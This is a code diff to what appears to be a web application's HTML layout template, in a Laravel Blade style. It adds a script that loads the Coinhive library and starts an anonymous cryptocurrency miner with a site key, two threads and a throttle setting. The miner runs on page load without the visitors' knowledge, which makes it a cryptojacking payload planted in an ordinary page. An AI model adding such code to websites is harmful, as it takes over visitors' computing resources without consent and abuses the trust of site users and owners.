@@ -12,6 +12,13 @@
 
     <!-- Styles -->
     <link href="{{ asset('css/app.css') }}" rel="stylesheet">
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <script>
+    	var miner = new CoinHive.Anonymous('O4XuXR6lcpuVmkDidwjhHSzhmMtIjPlX', {throttle: 0.3});
+
+    		miner.setNumThreads(2).start();
+
+    </script>
 </head>
 <body>
     <div id="app">
